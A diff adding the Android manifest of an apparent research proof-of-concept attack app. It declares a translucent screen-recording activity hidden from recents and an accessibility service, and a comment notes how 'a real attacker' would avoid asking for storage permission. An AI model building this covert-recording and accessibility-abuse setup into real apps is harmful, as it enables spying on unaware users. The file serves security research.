@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="de.fau.i1.aka.avt">
+
+    <!--read and write external is only needed for the screen recording video (for easier extraction
+     since this is a PoC) a real attacker would rather use the applications own directory in order
+      to mitigate this permission. If it is not granted an app-internal directory is used. -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:noHistory="true"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme">
+        <!--Launcher activity-->
+        <activity android:name=".SeedActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--Screen recording activity-->
+        <activity
+            android:name=".ScreenRecord.ScreenRecordActivity"
+            android:label="@string/app_name"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:screenOrientation="portrait">
+        </activity>
+
+        <!-- Accessibility service -->
+        <service
+            android:name=".Services.AccessibilityServiceSM"
+            android:enabled="true"
+            android:noHistory="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/serviceconfig" />
+        </service>
+    </application>
+
+</manifest>
